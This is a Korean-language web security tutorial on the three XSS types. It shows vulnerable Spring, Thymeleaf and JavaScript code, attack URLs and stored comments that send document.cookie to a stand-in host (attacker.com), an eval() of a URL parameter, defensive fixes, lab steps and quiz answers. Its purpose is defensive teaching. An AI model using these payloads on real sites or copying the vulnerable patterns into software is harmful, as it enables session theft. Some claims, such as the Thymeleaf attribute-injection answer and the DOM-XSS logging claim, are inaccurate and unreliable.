# XSS 3가지 유형: Reflected, Stored, DOM-based

---

## 🎯 핵심 질문

- Reflected XSS와 Stored XSS의 근본적인 차이는 무엇인가?
- DOM-based XSS가 서버 로그에 남지 않는 이유는?
- 동일한 `document.cookie` 탈취 공격도 유형에 따라 방어 방법이 달라지는가?

---

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

### 트위터 Worm 사건 (2010)
트위터에서 `onmouseover` 이벤트를 이용한 Stored XSS가 발생했습니다. 사용자가 프로필에 악성 스크립트를 저장하면, 방문자의 세션 토큰이 탈취되었고, 해당 토큰을 이용해 자동으로 팔로우 요청을 보냈습니다. 수 시간 내에 수백만 명의 계정이 영향을 받았습니다.

### 야후 메일 Reflected XSS (2015)
야후 메일의 검색 기능에서 검색어가 그대로 HTML에 렌더링되어 Reflected XSS가 발생했습니다. 공격자는 악의적인 검색 링크를 만들어 사용자를 유도했고, 클릭하면 쿠키가 탈취되어 메일 계정 접근 권한이 빼앗겼습니다.

### 페이스북 DOM XSS (2016)
페이스북의 클라이언트 JavaScript에서 `innerHTML`을 직접 조작할 때 DOM-based XSS가 발생했습니다. 서버는 안전한 응답을 보냈지만, 클라이언트 JavaScript가 URL 파라미터를 검증 없이 DOM에 삽입하면서 공격이 성공했습니다.

---

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

### Reflected XSS (검색 결과 페이지)

**Controller (Spring)**
```java
@RestController
@RequestMapping("/api/search")
public class SearchController {
    
    @GetMapping
    public ResponseEntity<String> search(@RequestParam String query) {
        // 위험: query 파라미터가 그대로 HTML에 렌더링됨
        String html = "<h1>검색 결과: " + query + "</h1>";
        return ResponseEntity.ok()
            .contentType(MediaType.TEXT_HTML)
            .body(html);
    }
}
```

**공격 URL**
```
https://vulnerable-site.com/api/search?query=<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
```

**실행 결과**
```html
<h1>검색 결과: <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)"></h1>
```
사용자가 이 URL을 클릭하면 `onerror` 이벤트가 발생하고 쿠키가 탈취됩니다.

---

### Stored XSS (게시물 댓글)

**Controller (Spring)**
```java
@RestController
@RequestMapping("/api/posts")
public class PostController {
    
    @Autowired
    private PostRepository postRepository;
    
    @PostMapping("/{id}/comments")
    public ResponseEntity<?> addComment(@PathVariable Long id, 
                                         @RequestBody CommentRequest req) {
        Comment comment = new Comment();
        comment.setContent(req.getContent()); // 위험: 검증 없이 저장
        comment.setPost(postRepository.findById(id).orElse(null));
        postRepository.save(comment); // DB에 저장됨
        return ResponseEntity.ok("댓글이 저장되었습니다");
    }
}

@Entity
public class Comment {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    @Column(columnDefinition = "LONGTEXT")
    private String content; // 원본 그대로 저장
}
```

**View (Thymeleaf)**
```html
<div th:each="comment : ${post.comments}">
    <!-- 위험: 이스케이핑 없이 HTML에 렌더링 -->
    <div th:utext="${comment.content}"></div>
</div>
```

**공격 흐름**
1. 공격자가 다음 댓글을 작성: `<script>alert('XSS')</script>`
2. 서버가 검증 없이 DB에 저장
3. 다른 사용자가 게시물을 보면 저장된 스크립트가 실행됨
4. 모든 방문자의 쿠키가 탈취됨

---

### DOM-based XSS (클라이언트 JavaScript)

**HTML**
```html
<input type="text" id="searchInput" placeholder="검색어 입력">
<div id="results"></div>
```

**JavaScript (취약한 코드)**
```javascript
document.getElementById('searchInput').addEventListener('input', function(e) {
    const query = this.value;
    // 위험: innerHTML에 직접 삽입 (서버 응답과 무관)
    document.getElementById('results').innerHTML = `
        <h3>검색 결과: ${query}</h3>
        <p>총 ${Math.random() * 100}개 결과</p>
    `;
});

// URL에서 쿼리 파라미터 추출
const params = new URLSearchParams(window.location.search);
const callback = params.get('callback');
// 위험: eval() 사용
eval(callback); // 예: callback=alert(document.cookie)
```

**공격 URL**
```
https://vulnerable-site.com/search?q=<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
https://vulnerable-site.com?callback=fetch('https://attacker.com?c='+document.cookie)
```

**공격 성공 이유**
- 서버 로그에 기록되지 않음
- 다른 사용자에게 영향을 주지 않음 (DOM만 조작)
- 서버 응답 검사로도 감지 불가능

---

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

### Reflected XSS 방어

**Option 1: 응답을 JSON으로 변경**
```java
@RestController
@RequestMapping("/api/search")
public class SearchController {
    
    @GetMapping
    public ResponseEntity<SearchResponse> search(@RequestParam String query) {
        // JSON 응답은 자동으로 이스케이핑됨
        return ResponseEntity.ok(
            new SearchResponse(
                escapeHtml(query), // 백엔드에서도 방어
                findResults(query)
            )
        );
    }
    
    private String escapeHtml(String input) {
        return input.replaceAll("&", "&amp;")
                   .replaceAll("<", "&lt;")
                   .replaceAll(">", "&gt;")
                   .replaceAll("\"", "&quot;")
                   .replaceAll("'", "&#x27;");
    }
}

@Data
public class SearchResponse {
    private String query;
    private List<Result> results;
}
```

**Option 2: Content-Type 명시 + 응답 헤더**
```java
@GetMapping
public ResponseEntity<String> search(@RequestParam String query) {
    return ResponseEntity.ok()
        .contentType(MediaType.APPLICATION_JSON) // JSON 강제
        .header("X-Content-Type-Options", "nosniff") // MIME 타입 고정
        .body(jsonResponse(query));
}
```

---

### Stored XSS 방어

**방어 1: 데이터 검증 및 이스케이핑**
```java
@RestController
@RequestMapping("/api/posts")
public class PostController {
    
    @Autowired
    private PostRepository postRepository;
    @Autowired
    private HtmlSanitizer htmlSanitizer;
    
    @PostMapping("/{id}/comments")
    public ResponseEntity<?> addComment(@PathVariable Long id, 
                                         @RequestBody @Valid CommentRequest req) {
        // 1단계: 입력값 검증
        if (req.getContent() == null || req.getContent().isEmpty()) {
            throw new IllegalArgumentException("댓글 내용이 비어있습니다");
        }
        
        // 2단계: XSS 필터링
        String sanitized = htmlSanitizer.sanitize(req.getContent());
        
        Comment comment = new Comment();
        comment.setContent(sanitized); // 정제된 내용 저장
        comment.setPost(postRepository.findById(id).orElse(null));
        postRepository.save(comment);
        
        return ResponseEntity.ok("댓글이 저장되었습니다");
    }
}
```

**HtmlSanitizer 구현 (OWASP Java Encoder)**
```java
@Component
public class HtmlSanitizer {
    
    public String sanitize(String input) {
        // OWASP Java HTML Encoder 사용
        // 또는 jsoup 라이브러리
        return Jsoup.clean(input, Whitelist.basicWithImages());
    }
}
```

**Thymeleaf View (이스케이핑 적용)**
```html
<!-- 방어: th:text는 자동으로 이스케이핑 -->
<div th:each="comment : ${post.comments}">
    <div th:text="${comment.content}"></div>
</div>

<!-- utext 사용 시에는 이미 정제된 HTML만 사용 -->
<div th:utext="${sanitizer.sanitize(comment.content)}"></div>
```

---

### DOM-based XSS 방어

**방어 방법**
```javascript
// ✅ 올바른 방법 1: textContent 사용 (HTML 태그 무시)
document.getElementById('results').textContent = `검색 결과: ${query}`;

// ✅ 올바른 방법 2: 안전한 DOM 메서드
const div = document.createElement('div');
const h3 = document.createElement('h3');
h3.textContent = '검색 결과: ' + query; // 자동으로 이스케이핑
div.appendChild(h3);
document.getElementById('results').appendChild(div);

// ✅ 올바른 방법 3: 라이브러리 사용 (DOMPurify)
const cleanHtml = DOMPurify.sanitize(`검색 결과: ${query}`);
document.getElementById('results').innerHTML = cleanHtml;

// ❌ 피할 것: innerHTML 직접 사용
// document.getElementById('results').innerHTML = `검색 결과: ${query}`;

// ❌ 피할 것: eval() 사용
// eval(userInput);
```

**안전한 URL 파라미터 처리**
```javascript
// ❌ 취약한 코드
const params = new URLSearchParams(window.location.search);
eval(params.get('callback')); // 절대 금지!

// ✅ 안전한 코드
const params = new URLSearchParams(window.location.search);
const action = params.get('action');

// 화이트리스트 기반 검증
const allowedActions = {
    'search': performSearch,
    'filter': performFilter,
    'sort': performSort
};

if (allowedActions[action]) {
    allowedActions[action]();
} else {
    console.warn('허용되지 않는 작업입니다');
}
```

---

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### Reflected XSS의 공격 흐름

```
1단계: 취약점 발견
┌─────────────────────────────────────────┐
│ https://vulnerable-site.com/search?q=<img src=x onerror="alert(1)">
│ 서버 응답: <h1>검색 결과: <img src=x onerror="alert(1)"></h1>
│ → 공격 성공 (스크립트 실행)
└─────────────────────────────────────────┘

2단계: 공격 자동화
┌─────────────────────────────────────────┐
│ 공격자가 실제 쿠키 탈취 페이로드로 변경
│ https://vulnerable-site.com/search?q=<img src=x onerror="new Image().src='https://attacker.com/steal?c='+document.cookie">
│
│ 3단계: 피싱 이메일 발송
│ "여기 클릭하세요: https://vulnerable-site.com/search?q=<img src=x ...>"
│
│ 4단계: 피해자가 링크 클릭
│ → 스크립트가 실행되어 쿠키가 attacker.com으로 전송됨
│ → 세션 하이재킹 성공
└─────────────────────────────────────────┘
```

### Stored XSS의 영구적 위험

```
1단계: 공격자가 악성 댓글 작성
┌─────────────────────────────────────────┐
│ POST /api/posts/123/comments
│ Content: "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>"
└─────────────────────────────────────────┘

2단계: 데이터베이스에 영구 저장
┌─────────────────────────────────────────┐
│ comments 테이블에 저장됨
│ id: 456
│ post_id: 123
│ content: "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>"
└─────────────────────────────────────────┘

3단계: 모든 사용자가 자동으로 피해입음
┌─────────────────────────────────────────┐
│ 사용자 A가 게시물 조회
│ → 저장된 스크립트가 A의 브라우저에서 실행
│ → A의 쿠키가 attacker.com으로 전송
│
│ 사용자 B, C, D, ...도 동일한 페이지 방문
│ → 모두 동일한 공격으로 피해입음
│
│ 공격자의 추가 조치 없이 계속 쿠키 수집
└─────────────────────────────────────────┘
```

### DOM-based XSS의 숨겨진 특성

```
1단계: 서버는 정상 응답
┌─────────────────────────────────────────┐
│ GET /page?q=<img src=x onerror="alert(1)">
│ 
│ 서버 응답 (HTML):
│ <html>
│   <body>
│     <input id="searchInput">
│     <div id="results"></div>
│     <script src="/js/app.js"></script>
│   </body>
│ </html>
│ 
│ → 서버 로그: GET /page?q=<img src=x onerror="alert(1)">
│ → 서버는 공격을 감지하지 못함!
└─────────────────────────────────────────┘

2단계: 클라이언트 JavaScript가 문제 발생
┌─────────────────────────────────────────┐
│ JavaScript 실행:
│ const q = new URLSearchParams(window.location.search).get('q');
│ // q = "<img src=x onerror="alert(1)">"
│ 
│ document.getElementById('results').innerHTML = `검색: ${q}`;
│ // 위험: 스크립트가 실행됨!
│
│ → 서버 요청 없이 클라이언트에서만 실행
│ → WAF(Web Application Firewall) 탐지 불가능
└─────────────────────────────────────────┘

3단계: 모니터링 회피
┌─────────────────────────────────────────┐
│ 서버 측:
│ - 접근 로그에는 정상 URL만 기록
│ - 요청/응답 검사로 공격 탐지 불가능
│
│ 클라이언트 측:
│ - 악의적인 스크립트가 DOM에서만 실행
│ - 네트워크 패킷에 스크립트가 보이지 않음
│ - 다른 사용자에게는 영향 없음
└─────────────────────────────────────────┘
```

---

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실험 1: Reflected XSS 재현 및 방어

**Step 1: 취약한 서버 구성**
```bash
# Spring Boot 서버 시작
./mvnw spring-boot:run
```

**Step 2: 공격 URL 생성**
```javascript
// 콘솔에서 실행
const payload = `<img src=x onerror="alert('XSS Vulnerability Found!'); fetch('http://attacker.local/steal?cookie=' + document.cookie)">`;
const encodedPayload = encodeURIComponent(payload);
console.log(`http://localhost:8080/search?q=${encodedPayload}`);
```

**Step 3: 공격 확인**
```
브라우저에서 생성된 URL 방문
→ alert() 팝업 확인
→ 네트워크 요청 탭에서 attacker.local로 가는 요청 확인
```

**Step 4: 방어 적용**
```java
// Controller 수정
@GetMapping
public ResponseEntity<Map<String, Object>> search(@RequestParam String query) {
    String escaped = escapeHtml(query); // 이스케이핑 추가
    return ResponseEntity.ok()
        .contentType(MediaType.APPLICATION_JSON)
        .header("X-Content-Type-Options", "nosniff")
        .body(Map.of(
            "query", escaped,
            "results", findResults(query)
        ));
}
```

**Step 5: 방어 검증**
```
동일한 공격 URL 재시도
→ JSON 응답 확인
→ 스크립트가 실행되지 않음
→ 쿠키가 전송되지 않음
```

---

### 실험 2: Stored XSS 재현

**Step 1: 취약한 댓글 기능**
```bash
# 악성 댓글 작성 (서버는 검증 없이 저장)
curl -X POST http://localhost:8080/api/posts/1/comments \
  -H "Content-Type: application/json" \
  -d '{"content":"<script>alert(\"Stored XSS\")</script>"}'
```

**Step 2: 피해 확인**
```
웹 브라우저에서 게시물 조회
→ 저장된 스크립트가 자동으로 실행
→ alert() 팝업 표시
```

**Step 3: 방어 적용**
```xml
<!-- pom.xml에 의존성 추가 -->
<dependency>
    <groupId>org.jsoup</groupId>
    <artifactId>jsoup</artifactId>
    <version>1.15.3</version>
</dependency>
```

```java
@Component
public class HtmlSanitizer {
    public String sanitize(String input) {
        return Jsoup.clean(input, Whitelist.basic());
    }
}

// Controller 수정
@PostMapping("/{id}/comments")
public ResponseEntity<?> addComment(@PathVariable Long id, 
                                     @RequestBody CommentRequest req) {
    String sanitized = htmlSanitizer.sanitize(req.getContent());
    // 정제된 내용만 저장
    comment.setContent(sanitized);
    commentRepository.save(comment);
    return ResponseEntity.ok("댓글이 저장되었습니다");
}
```

**Step 4: 방어 검증**
```
동일한 악성 댓글 작성
→ DB에는 정제된 HTML만 저장
  예: "<p>Stored XSS</p>" (script 태그 제거됨)
→ 클라이언트에서 스크립트 실행 안 됨
```

---

### 실험 3: DOM-based XSS 재현

**Step 1: 취약한 클라이언트 코드**
```html
<input type="text" id="searchInput" placeholder="검색어">
<div id="results"></div>

<script>
// ❌ 취약한 코드
document.getElementById('searchInput').addEventListener('input', function(e) {
    const q = this.value;
    document.getElementById('results').innerHTML = `
        <h3>검색 결과: ${q}</h3>
    `;
});
</script>
```

**Step 2: XSS 페이로드 입력**
```
input 필드에 다음 입력:
<img src=x onerror="alert('DOM XSS')">

→ 즉시 alert() 실행
```

**Step 3: 방어 적용**
```javascript
// ✅ 안전한 코드
document.getElementById('searchInput').addEventListener('input', function(e) {
    const q = this.value;
    
    // 방법 1: textContent 사용 (권장)
    const h3 = document.createElement('h3');
    h3.textContent = '검색 결과: ' + q;
    
    const resultsDiv = document.getElementById('results');
    resultsDiv.innerHTML = ''; // 기존 내용 제거
    resultsDiv.appendChild(h3);
});
```

**Step 4: 방어 검증**
```
동일한 페이로드 재입력
→ 스크립트 태그가 문자열로 표시됨
→ alert() 실행 안 됨
```

---

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 구분 | Reflected XSS | Stored XSS | DOM-based XSS |
|------|---|---|---|
| **공격 성공 조건** | 사용자가 악의적인 링크 클릭 | 공격자가 댓글/게시물 작성 가능 | JavaScript에서 사용자 입력을 필터링 없이 DOM에 삽입 |
| **피해 범위** | 링크를 클릭한 사람만 피해 | 해당 페이지 모든 방문자 피해 | 공격 URL을 방문한 사람만 피해 |
| **탐지 난이도** | 낮음 (URL에 페이로드 visible) | 낮음 (DB에 저장된 스크립트) | 높음 (서버 로그에 나타나지 않음) |
| **방어 1순위** | API 응답을 JSON으로 강제 | HTML 이스케이핑 + 입력 검증 | textContent 사용, innerHTML 금지 |
| **추가 방어** | CSP, X-Content-Type-Options | 콘텐츠 정제(sanitization) | DOMPurify, 화이트리스트 검증 |
| **서버 로그 기록** | 공격 URL 기록됨 | 정제되지 않은 요청 기록됨 | 기록되지 않음 |
| **브라우저 캐시 위험** | 스크립트가 캐시될 수 있음 | 영구 저장 | URL이 히스토리에 남음 |

---

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

### 1. 응답 형식 변경 (JSON vs HTML)

**보안 강화**: HTML 응답을 JSON으로 변경
```
장점: Reflected XSS 원천 차단
단점: 기존 HTML 응답 형식 변경 필요, 프론트엔드 코드 수정
```

### 2. 이스케이핑 vs Rich Text Editor

**보안**: HTML 이스케이핑 강제
```
장점: XSS 완벽 차단
단점: 사용자가 텍스트 형식(굵게, 색상 등) 사용 불가

절충안: jsoup의 Whitelist.basicWithImages()
→ 기본 마크업만 허용 (<b>, <i>, <p> 등)
→ 위험한 태그 제거 (<script>, <iframe> 등)
```

### 3. DOM 조작 방식

**보안**: textContent 사용
```javascript
// 안전하지만 제한적
h3.textContent = userInput;

// 절충안: 안전한 템플팅 라이브러리
const template = document.querySelector('#result-template');
const clone = template.content.cloneNode(true);
clone.querySelector('h3').textContent = userInput;
```

### 4. 성능 vs 입력 검증

**보안**: 모든 입력 검증
```
추가 CPU: 정규식, 길이 제한 체크
영향: 대량 요청 시 약간의 지연 가능

최적화:
- 검증 로직 캐싱
- 정규식 컴파일 미리 수행
- 검증 규칙 단순화
```

---

## 📌 핵심 정리

### XSS 유형별 특징

1. **Reflected XSS**: 요청 파라미터 → 응답에 반사
   - 공격자 링크를 사용자가 클릭해야 함
   - 방어: JSON 응답, HTML 이스케이핑

2. **Stored XSS**: 악성 데이터 → DB 저장 → 모든 사용자에 영향
   - 공격자가 한 번만 주입하면 계속 피해 발생
   - 방어: 입력 검증, HTML 정제, 출력 이스케이핑

3. **DOM-based XSS**: 서버와 무관하게 클라이언트 JavaScript 취약점
   - 서버 로그에 나타나지 않음
   - 방어: textContent 사용, eval() 금지, 라이브러리 이용

### 모든 XSS의 공통 원인

```
신뢰할 수 없는 입력 + 검증 없음 + HTML 컨텍스트 렌더링
= XSS 취약점
```

### 방어의 3단계

1. **입력 검증**: 예상 형식만 허용
2. **데이터 정제**: 위험한 태그 제거
3. **출력 이스케이핑**: HTML 특수 문자 변환

---

## 🤔 생각해볼 문제 (+ 해설)

### Q1. 다음 코드에서 XSS가 발생하는가?

```javascript
const userName = "Alice<script>alert('XSS')</script>";
document.getElementById('greeting').textContent = `Hello, ${userName}`;
```

**해설**
```
❌ XSS 발생 안 함

이유:
- textContent는 HTML 태그를 문자열로 처리
- <script>는 스크립트가 아니라 텍스트로 렌더링됨

결과: "Hello, Alice<script>alert('XSS')</script>"가 그대로 표시됨

만약 innerHTML을 사용했다면:
✅ XSS 발생!
document.getElementById('greeting').innerHTML = `Hello, ${userName}`;
→ 스크립트가 실행됨
```

---

### Q2. 이 응답은 Reflected XSS에 안전한가?

```json
{
  "searchQuery": "<img src=x onerror=\"alert('XSS')\">",
  "results": []
}
```

**해설**
```
✅ JSON 응답이므로 안전

이유:
- JSON은 텍스트 기반 데이터 포맷
- 브라우저가 JSON.parse()로 파싱하면 단순 문자열이 됨
- HTML로 렌더링되지 않음

주의사항:
1. Content-Type: application/json 필수
   - application/text이면 문자열로 해석되어 위험
2. X-Content-Type-Options: nosniff 헤더 추가
   - MIME 타입 강제로 명시 (IE에서 MIME 스니핑 방지)

만약 응답이 HTML이었다면:
✅ XSS 발생!
<div>검색 쿼리: <img src=x onerror="alert('XSS')"></div>
```

---

### Q3. Stored XSS 방어에서 DB에 정제된 HTML을 저장해야 하나, 원본을 저장해야 하나?

**해설**
```
권장: 원본을 저장하고, 출력할 때 정제

이유:
1. 정책 변경 유연성
   - 보안 정책을 강화하면 이전 데이터도 영향 받음
   - 정제 알고리즘을 개선할 수 있음

2. 데이터 활용성
   - API로 원본 데이터 제공 가능
   - 모바일 앱 등 다양한 클라이언트 지원

3. 감사(Audit)
   - 원본 데이터 추적 가능
   - 공격자의 정확한 페이로드 분석 가능

구현 방식:
```java
@Entity
public class Comment {
    @Column(columnDefinition = "LONGTEXT")
    private String rawContent; // 원본 저장
    
    // 화면 표시용 메서드
    public String getSafeHtml() {
        return Jsoup.clean(rawContent, Whitelist.basic());
    }
}
```

참고: HTML 편집기를 지원하는 경우는 예외
- CKEditor 같은 WYSIWYG 에디터 사용 시
- jsoup의 Whitelist.basicWithImages() 적용
```

---

### Q4. DOM-based XSS와 Reflected XSS의 근본적 차이는?

**해설**
```
                Reflected XSS          │    DOM-based XSS
────────────────────────────────────────┼──────────────────────
서버 관여       필수 (응답에 포함)      │    불필요
로그 기록       기록됨 (URL에 보임)     │    기록 안 됨
시간 소요       Request → Response       │    JavaScript 실행
모니터링        WAF, IDS로 탐지 가능    │    탐지 불가능
공격 자동화     쉬움 (링크만 전송)      │    쉬움 (URL만 전송)

공통점:
- 모두 HTML 컨텍스트에서 신뢰할 수 없는 입력 실행
- 모두 쿠키, 세션 탈취 가능
- 모두 사용자 행동 기록 가능
```

---

### Q5. 다음 중 XSS 공격이 성공하는 경우는?

```html
<!-- 1번 -->
<div th:text="${userInput}"></div>

<!-- 2번 -->
<div th:utext="${userInput}"></div>

<!-- 3번 -->
<img alt="" th:attr="src=${userInput}">
```

**해설**
```
1번: ❌ XSS 불가능
- th:text는 자동으로 HTML 이스케이핑
- <script> → &lt;script&gt; 변환

2번: ✅ XSS 가능
- th:utext는 raw HTML로 렌더링
- 정제되지 않은 입력이 그대로 실행됨
- userInput = "<script>alert('XSS')</script>"
- 결과: 스크립트 실행됨

3번: ✅ XSS 가능 (속성 기반)
- th:attr="src=${userInput}"는 검증 없음
- userInput = "x onerror='alert(1)'"
- 결과: <img src="x onerror='alert(1)'"> → onerror 실행
- 더 안전한 방법: th:attr="src=@{/path/__${userInput}__}"

교훈:
- 항상 th:text 사용 (기본값)
- th:utext는 필요할 때만 사용 (정제된 데이터만)
- 속성 주입도 주의 필요
```

<div align="center">

**[홈으로 🏠](../README.md)** | **[다음: 백엔드 개발자의 XSS 방어 책임 ➡️](./02-backend-xss-defense.md)**

</div>
